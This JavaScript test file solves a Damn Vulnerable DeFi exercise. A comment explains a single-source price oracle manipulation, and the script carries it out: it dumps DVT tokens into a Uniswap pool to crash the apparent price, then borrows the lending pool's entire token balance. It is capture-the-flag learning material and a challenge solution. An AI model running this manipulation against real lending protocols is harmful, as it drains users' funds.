/**
This exploit didn't require a contract to execute, so this is the extent of the proof.

Essentially, this is nearly the same exercise as Ethernaut level 22, 'Dex'. Sort of.
It's the same sort of single-source oracle manipulation as puppet 1. By selling my
stack of DVT into the pool, I make the pool very unbalanced and I give the appearance
that DVT's price has dropped significantly. I am then able to borrow the full stack 
of DVT out of the lending pool.

I think this level could be improved to show how an attacker might then aright the 
pool, so that the apparent value of the DVT is corrected. 
*/

it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    const exchangeConnection = this.uniswapExchange.connect(attacker)
    const routerConnection = this.uniswapRouter.connect(attacker)
    const tokenConnection = this.token.connect(attacker)
    const WETHConnection = this.weth.connect(attacker)
    const lendingConnection = this.lendingPool.connect(attacker)

    await tokenConnection.approve(this.uniswapRouter.address, "10000000000000000000000")
    await routerConnection.swapExactTokensForETH(
        await tokenConnection.balanceOf(attacker.address),
        0,
        [this.token.address, this.weth.address],
        attacker.address,
        (await ethers.provider.getBlock('latest')).timestamp * 2
    )

    const depositRequired = (await lendingConnection.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)).toString()
    await WETHConnection.deposit({value: depositRequired})
    await WETHConnection.approve(this.lendingPool.address, depositRequired)

    await lendingConnection.borrow(POOL_INITIAL_TOKEN_BALANCE)
});
